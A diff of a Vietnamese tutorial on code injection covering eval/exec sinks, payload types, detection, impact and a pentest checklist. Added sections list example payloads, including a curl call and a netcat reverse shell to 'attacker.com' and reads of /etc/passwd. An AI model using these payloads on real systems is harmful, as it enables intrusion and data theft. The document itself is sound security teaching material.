@@ -1,4 +1,4 @@
-﻿# Code Injection
+# Code Injection
 
 ## Tài liệu tham khảo
 
@@ -14,17 +14,9 @@
 Code Injection
 │
 ├── 1. Kiến thức nền
-│   ├── Programming Runtime là gì
-│   ├── Interpreter và Compiler
-│   ├── Code được thực thi như thế nào
 │   ├── Dynamic Evaluation là gì
 │   ├── RCE và vị trí của Code Injection
-│   ├── Phân biệt
-│   │   ├── Code Injection
-│   │   ├── Command Injection
-│   │   ├── Template Injection
-│   │   └── Deserialization
-│   └── Luồng xử lý tổng quan
+│   └── Phân biệt Code Injection, Command Injection, Template Injection
 │
 ├── 2. Code Injection
 │   ├── Khái niệm
@@ -36,26 +28,16 @@ Code Injection
 │
 ├── 3. Code Sink
 │   ├── PHP
-│   ├── Python
-│   ├── JavaScript
-│   ├── Java
-│   ├── Ruby
-│   └── .NET
+│   └── Python
 │
 ├── 4. Dynamic Evaluation
 │   ├── eval()
-│   ├── exec()
-│   ├── Function()
-│   ├── Reflection
-│   ├── Dynamic Import
-│   └── Vì sao Dynamic Evaluation nguy hiểm
+│   └── exec()
 │
 ├── 5. Payload
 │   ├── Arithmetic payload
 │   ├── Information disclosure
 │   ├── File access
-│   ├── Runtime object access
-│   ├── Sandbox escape
 │   └── RCE payload
 │
 ├── 6. Detection
@@ -65,16 +47,7 @@ Code Injection
 │   ├── Static review
 │   └── Runtime monitoring
 │
-├── 7. Bypass
-│   ├── Blacklist bypass
-│   ├── Encoding
-│   ├── String concatenation
-│   ├── Reflection
-│   ├── Object access
-│   ├── Sandbox escape
-│   └── Filter bypass
-│
-├── 8. Impact
+├── 7. Impact
 │   ├── Information Disclosure
 │   ├── Authentication Bypass
 │   ├── Arbitrary File Read
@@ -83,15 +56,14 @@ Code Injection
 │   ├── Privilege Escalation
 │   └── Persistence
 │
-├── 9. Case Study
+├── 8. Case Study
 │   ├── PHP eval
 │   ├── Python eval
 │   ├── Node.js eval
-│   ├── Expression Language Injection
-│   ├── Template Engine
+│   ├── Expression Language
 │   └── Real CVEs
 │
-└── 10. Pentest Checklist
+└── 9. Pentest Checklist
     ├── Source
     ├── Sink
     ├── Dangerous APIs
@@ -101,63 +73,6 @@ Code Injection
 ```
 
 ## 1. Kiến thức nền
-
-### Programming Runtime là gì
-
-Khi một ứng dụng web được chạy, ngôn ngữ lập trình cần một môi trường để hoạt động. Môi trường đó gọi là Programming Runtime.
-
-Runtime đảm nhiệm các công việc sau:
-
-* Nạp mã nguồn hoặc bytecode vào bộ nhớ.
-* Phân tích và thực thi từng câu lệnh trong mã nguồn.
-* Quản lý bộ nhớ, biến, hàm và đối tượng trong suốt vòng đời chương trình.
-* Cung cấp thư viện chuẩn và các hàm tích hợp sẵn (built-in functions).
-
-Các ví dụ phổ biến:
-
-| Ngôn ngữ                 | Runtime                                        |
-| -------------------------- | ---------------------------------------------- |
-| PHP                        | Zend Engine                                    |
-| Python                     | CPython (hay còn gọi là Python Interpreter) |
-| JavaScript (trình duyệt) | V8 Engine (Chrome), SpiderMonkey (Firefox)     |
-| JavaScript (máy chủ)     | Node.js Runtime                                |
-| Java                       | JVM (Java Virtual Machine)                     |
-| C# / .NET                  | CLR (Common Language Runtime)                  |
-| Ruby                       | MRI Ruby (Matz Ruby Interpreter)               |
-
-### Interpreter và Compiler
-
-Có hai phương thức xử lý mã nguồn hoàn toàn khác nhau:
-
-Compiler (Trình biên dịch): Chuyển đổi toàn bộ mã nguồn sang mã máy trước khi chạy. Ngôn ngữ điển hình là C, C++, Go. Chương trình sau khi biên dịch là tệp nhị phân không còn liên hệ với mã nguồn gốc trong quá trình chạy.
-
-Interpreter (Trình thông dịch): Đọc và thực thi mã nguồn trực tiếp từng dòng hoặc từng câu lệnh trong quá trình chạy. Ngôn ngữ điển hình là PHP, Python, Ruby, JavaScript. Đặc điểm quan trọng là runtime vẫn tồn tại trong suốt vòng đời ứng dụng và có khả năng nhận thêm mã mới để thực thi.
-
-Lý do điều này quan trọng với bảo mật: Các ngôn ngữ dùng interpreter thường cung cấp hàm cho phép biên dịch và chạy chuỗi ký tự như mã lệnh. Đây là nền tảng của toàn bộ lớp lỗ hổng Code Injection.
-
-### Code được thực thi như thế nào
-
-Ở mức runtime, một chuỗi ký tự có thể trở thành mã lệnh nếu được đưa vào đúng hàm:
-
-```python
-# day la du lieu binh thuong
-ten_bien = "hello"
-
-# day la ma lenh duoc thuc thi tu chuoi ky tu
-eval("print('hello')")
-# Runtime doc chuoi "print('hello')", phan tich cu phap va thuc thi nhu mot lenh Python that su
-```
-
-Quy trình thực thi chuỗi ký tự dưới dạng mã lệnh:
-
-```mermaid
-graph LR
-    A["Chuỗi ký tự (String)"] --> B["Hàm Dynamic Eval (eval / exec)"]
-    B --> C["Parser: Phân tích cú pháp"]
-    C --> D["Bytecode / AST"]
-    D --> E["Runtime thực thi"]
-    E --> F["Kết quả"]
-```
 
 ### Dynamic Evaluation là gì
 
@@ -205,7 +120,6 @@ Bốn lớp lỗ hổng này thường bị nhầm lẫn vì đều có thể d�
 | Template Injection | Template Engine (Jinja2, Twig, Freemarker)           | render(), template()          | `{{}}` `${}` `#{}`                      |
 | Deserialization    | Runtime đọc lại đối tượng đã tuần tự hóa | unserialize(), pickle.loads() | Dữ liệu nhị phân / JSON / XML đặc biệt |
 
-
 Ví dụ minh họa sự khác nhau với cùng một kết quả (chạy lệnh whoami):
 
 ```php
@@ -224,21 +138,6 @@ shell_exec('whoami');
 
 # Code Injection: chay trong Python runtime
 eval("__import__('os').system('whoami')")
-```
-
-### Luồng xử lý tổng quan
-
-```mermaid
-graph TD
-    A["Người dùng (Attacker)"] --> B["HTTP Request (tham số đầu vào)"]
-    B --> C["Ứng dụng Web"]
-    C --> D{"Kiểm soát đầu vào?"}
-    D -->|"Có kiểm soát"| E["Validation / Sanitization"]
-    E --> F["Xử lý an toàn"]
-    D -->|"Không kiểm soát"| G["Hàm Dynamic Eval (eval, exec...)"]
-    G --> H["Runtime thực thi mã độc"]
-    H --> I["Đọc file, gọi OS, lấy dữ liệu..."]
-    I --> J["Kẻ tấn công nhận kết quả"]
 ```
 
 ## 2. Code Injection
@@ -398,93 +297,8 @@ result = eval(expression)               # Runtime Python thuc thi lenh id tren h
 print(result)
 ```
 
-### JavaScript (Node.js)
-
-| Hàm / Cơ chế           | Mô tả                                           | Mức độ nguy hiểm |
-| ------------------------- | ------------------------------------------------- | -------------------- |
-| `eval()`                | Thực thi chuỗi như mã JavaScript              | Rất cao             |
-| `new Function()`        | Tạo hàm mới từ chuỗi mã nguồn              | Rất cao             |
-| `setTimeout(string)`    | Phiên bản chuỗi thực thi mã JavaScript       | Cao                  |
-| `setInterval(string)`   | Tương tự setTimeout                            | Cao                  |
-| `vm.runInThisContext()` | Thực thi mã trong ngữ cảnh Node.js hiện tại | Rất cao             |
-| `vm.runInNewContext()`  | Thực thi trong sandbox (có thể bị thoát)     | Cao                  |
-
-Ví dụ nguy hiểm với `new Function()`:
-
-```javascript
-// Server-side Node.js
-const express = require('express');
-const app = express();
-
-app.get('/calculate', (req, res) => {
-    const expr = req.query.expr;
-    // attacker truyen: "require('child_process').execSync('whoami').toString()"
-
-    // Tao ham tu chuoi va goi ngay
-    const result = new Function(`return ${expr}`)();
-    res.send(result.toString());
-});
-```
-
-### Java
-
-Java không có hàm eval() tương đương như PHP hay Python, nhưng có các cơ chế thay thế cũng nguy hiểm không kém:
-
-| Cơ chế                                          | Mô tả                                                               | Mức độ nguy hiểm |
-| ------------------------------------------------- | --------------------------------------------------------------------- | -------------------- |
-| `javax.script.ScriptEngine` (JavaScript Engine) | Thực thi mã JavaScript hoặc các ngôn ngữ script khác trong JVM | Rất cao             |
-| `Reflection API` (Class.forName, Method.invoke) | Gọi lớp và hàm theo tên chuỗi                                   | Cao                  |
-| `Groovy ScriptEngine`                           | Thực thi mã Groovy (JVM language)                                   | Rất cao             |
-| `Expression Language (EL)`                      | Thực thi biểu thức EL trong các framework Java EE                 | Cao                  |
-
-Ví dụ nguy hiểm với ScriptEngine:
-
-```java
-import javax.script.ScriptEngine;
-import javax.script.ScriptEngineManager;
-
-public class VulnerableCalc {
-    public static void main(String[] args) throws Exception {
-        // Lay du lieu tu nguoi dung
-        String userInput = args[0];
-        // attacker truyen: "java.lang.Runtime.getRuntime().exec('id')"
-
-        ScriptEngineManager manager = new ScriptEngineManager();
-        ScriptEngine engine = manager.getEngineByName("JavaScript");
-
-        // Thuc thi ma JavaScript trong JVM
-        Object result = engine.eval(userInput);
-        System.out.println(result);
-    }
-}
-```
-
-### Ruby
-
-| Hàm / Cơ chế                      | Mô tả                                                | Mức độ nguy hiểm |
-| ------------------------------------ | ------------------------------------------------------ | -------------------- |
-| `eval()`                           | Thực thi chuỗi như mã Ruby                         | Rất cao             |
-| `instance_eval()`                  | Thực thi mã trong ngữ cảnh của một đối tượng | Rất cao             |
-| `class_eval()` / `module_eval()` | Thực thi mã trong ngữ cảnh của lớp hoặc module  | Rất cao             |
-| `send()`                           | Gọi hàm theo tên chuỗi                             | Cao                  |
-| `public_send()`                    | Gọi hàm public theo tên chuỗi                      | Trung bình          |
-
-Ví dụ nguy hiểm:
-
-```ruby
-# Nguoi dung chon hanh dong
-action = params[:action]   # attacker truyen: "system('id')"
-eval(action)               # Ruby thuc thi lenh he thong
-```
-
-### .NET (C#)
-
-| Cơ chế                                | Mô tả                                     | Mức độ nguy hiểm |
-| --------------------------------------- | ------------------------------------------- | -------------------- |
-| `CSharpCodeProvider`                  | Biên dịch và chạy mã C# động         | Rất cao             |
-| `Roslyn Scripting API`                | Biên dịch và thực thi C#/VB.NET         | Rất cao             |
-| `Reflection` (Type.GetMethod, Invoke) | Gọi hàm theo tên chuỗi                  | Cao                  |
-| `Expression Trees`                    | Xây dựng và thực thi biểu thức động | Trung bình          |
+> 📌 **Ngôn ngữ khác (xem thêm khi đã vững nền):**
+> JavaScript, Java, Ruby, và .NET cũng có các cơ chế Dynamic Evaluation tương tự. Khi đã hiểu rõ mô hình Source → Sink → Runtime, việc nhận diện sẽ áp dụng được sang các ngôn ngữ khác theo cùng nguyên lý.
 
 ## 4. Dynamic Evaluation
 
@@ -492,17 +306,46 @@ eval(action)               # Ruby thuc thi lenh he thong
 
 `eval()` là hàm phổ biến nhất và nguy hiểm nhất trong nhóm Dynamic Evaluation. Hàm này nhận một chuỗi ký tự và yêu cầu runtime của ngôn ngữ xử lý chuỗi đó như một đoạn mã nguồn hợp lệ.
 
-Cơ chế hoạt động bên trong:
+Ví dụ so sánh hành vi:
 
-```mermaid
-graph TD
-    A["Chuỗi đầu vào: 'system(whoami)'"] --> B["Lexer: Tách token"]
-    B --> C["Parser: Xây dựng cây cú pháp AST"]
-    C --> D["Evaluator: Thực thi từng node trong AST"]
-    D --> E["Kết quả trả về"]
+```python
+# Binh thuong: chuoi chi la du lieu
+s = "1 + 1"
+print(s)       # In ra: 1 + 1 (chuoi ky tu)
+
+# Voi eval: chuoi tro thanh lenh
+result = eval("1 + 1")
+print(result)  # In ra: 2 (ket qua tinh toan)
+
+# Nguy hiem: chuoi tuy y tro thanh lenh
+result = eval("__import__('os').getcwd()")
+print(result)  # In ra: /var/www/html (thu muc lam viec hien tai)
 ```
 
-Ví dụ so sánh hành vi:
+### exec()
+
+`exec()` khác với `eval()` ở chỗ nó thực thi được cả khối mã (nhiều dòng, khai báo hàm, vòng lặp...) thay vì chỉ biểu thức đơn.
+
+```python
+# eval chi chap nhan bieu thuc don
+# eval("x = 1 + 1")  # Loi: khong the gan bien bang eval
+
+# exec chap nhan ca khoi ma nhieu dong
+exec("""
+x = 10
+y = 20
+def add(a, b):
+    return a + b
+result = add(x, y)
+print(result)
+""")
+# Ket qua: In ra 30
+```
+
+Đây là lý do exec() nguy hiểm hơn eval(): Kẻ tấn công có thể định nghĩa hàm, vòng lặp, import module, và thực hiện bất kỳ thao tác nào mà Python hỗ trợ.
+
+> 📌 **Cơ chế nâng cao (xem thêm khi đã vững nền):**
+> Ngoài `eval()` và `exec()`, còn có các cơ chế Dynamic Evaluation khác đáng lưu ý khi kiểm tra: `new Function()` trong JavaScript, Reflection API trong PHP/Java, và Dynamic Import trong Python/Node.js.
 
 ```python
 # Binh thuong: chuoi chi la du lieu
@@ -657,6 +500,50 @@ system('whoami');
 __import__('os').system('whoami')
 ```
 
+### Payload RCE
+
+```php
+exec('curl http://attacker.com/');
+```
+
+```python
+__import__('os').system('nc -e /bin/bash attacker.com 4444')
+```
+
+### Payload khai thác thông tin
+
+```php
+phpinfo();
+```
+
+```python
+__import__('os').system('id')
+```
+
+```javascript
+require('child_process').execSync('whoami').toString()
+```
+
+### Payload truy cập file
+
+```php
+file_get_contents('/etc/passwd');
+```
+
+```python
+open('/etc/passwd').read()
+```
+
+### Payload thực thi lệnh
+
+```php
+system('whoami');
+```
+
+```python
+__import__('os').system('whoami')
+```
+
 ### Payload sandbox escape
 
 Trong một số môi trường sandbox, kẻ tấn công có thể tìm cách thoát khỏi giới hạn bằng cách truy cập tới các module hoặc API cho phép thực thi mã ngoài phạm vi kiểm soát.
@@ -757,7 +644,7 @@ Code Injection có thể dẫn tới nhiều hậu quả nghiêm trọng:
 * Remote Code Execution (RCE): điều khiển hoàn toàn hệ thống mục tiêu.
 * Persistence: cài đặt backdoor hoặc malware dài hạn.
 
-## 9. Case Study
+## 8. Case Study
 
 ### PHP eval
 
@@ -796,7 +683,7 @@ Một số framework dùng template engine hoặc expression language để rend
 
 Nhiều ứng dụng web và framework từng bị khai thác vì dùng dynamic eval hoặc expression engine không an toàn. Đây là lý do vì sao các nhà phát triển cần luôn tránh việc thực thi chuỗi đầu vào trực tiếp.
 
-## 10. Pentest Checklist
+## 9. Pentest Checklist
 
 ### Source
 
@@ -831,3 +718,13 @@ Nhiều ứng dụng web và framework từng bị khai thác vì dùng dynamic 
 * Dùng whitelist và least privilege.
 * Xác nhận bằng payload đơn giản trước khi thử RCE.
 * Ghi chép rõ luồng Source → Sink → Runtime → Impact.
+
+---
+
+> **Nội dung nâng cao (xem thêm khi đã vững nền):**
+> Các mục sau đây dành cho người đã nắm vững các khái niệm cơ bản:
+>
+> - **Bypass kỹ thuật** — Blacklist bypass, encoding, string concatenation, sandbox escape, filter bypass.
+> - **JavaScript / Node.js Code Sink** — `new Function()`, `vm.runInThisContext()`, `vm.runInNewContext()`.
+> - **Java / Ruby / .NET Code Sink** — ScriptEngine, Groovy, Expression Language, Reflection API, Roslyn Scripting.
+> - **Dynamic Import** — `__import__()` trong Python, `require()` trong Node.js.
